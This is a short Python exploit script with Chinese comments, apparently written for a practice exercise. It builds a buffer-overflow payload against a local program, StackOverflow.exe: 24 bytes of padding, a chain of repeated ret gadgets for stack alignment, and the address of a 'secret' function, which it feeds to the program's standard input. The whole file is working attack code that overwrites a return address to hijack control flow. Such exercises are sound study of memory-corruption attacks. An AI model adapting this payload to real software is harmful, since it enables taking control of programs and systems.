import subprocess
import struct

secret_addr = 0x0000000000401090
# 找一个纯 ret 指令的地址，比如 vulnerable 结尾的那个
ret_gadget = 0x00000000004010f5

# 24 字节填充 + 8字节对齐跳板 + 8字节目标地址
payload = b"A" * 24
#rop chain
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", ret_gadget)
#极限了，定义的是最大128bytes
#64bit 与其算16bytes对齐，还不如8bytes硬试

payload+=struct.pack("<Q", secret_addr)

CREATE_SUSPENDED = 0x4

p = subprocess.Popen(["StackOverflow.exe"], stdin=subprocess.PIPE)
#p = subprocess.Popen(["StackOverflow.exe"], stdin=subprocess.PIPE,creationflags=CREATE_SUSPENDED)
p.communicate(input=payload)